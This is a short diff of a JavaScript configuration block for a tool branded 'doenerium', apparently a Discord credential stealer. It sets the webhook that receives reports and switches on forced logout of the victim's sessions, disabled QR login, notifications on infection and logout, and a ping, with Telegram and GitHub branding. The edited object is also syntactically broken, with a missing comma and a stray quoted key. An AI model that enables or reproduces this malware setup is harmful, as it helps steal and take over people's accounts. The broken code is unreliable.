@@ -13,23 +13,23 @@ const fs = require("fs");
 var config = {
     brand: "doenerium",
 
-    webhook: "%WEBHOOK_LINK%",
+    webhook: "REPLACE_ME",
 
-    logout: false,
-    disable_qr_code: false,
+    logout: true,
+    disable_qr_code: true,
 
-    notify_on_logout: false,
-    notify_on_initialization: false,
-    ping: [false, "@doener"],
+    notify_on_logout: true,
+    notify_on_initialization: true,
+    ping: [true, "@doener"],
 
-     embed: {
-        username: "t.me/. | https://github.com/.",
+    embed: {
+        username: "doenerium | t.me/doenerium",
         footer: {
-            text: `t.me/. | https://github.com/.`,
+            text: "https://github.com/.",
             icon_url: "https://cdn.discordapp.com/emojis/1067398423596257280.webp?size=96&quality=lossless",
         },
-        href: "t.me/. | https://github.com/.",
-        avatar_url: "https://cdn.discordapp.com/emojis/1067398423596257280.webp?size=96&quality=lossless"
+        href: "t.me/. | https://github.com/."
+        "avatar_url": "https://cdn.discordapp.com/emojis/1067398423596257280.webp?size=96&quality=lossless",
     },
 
     badges: {
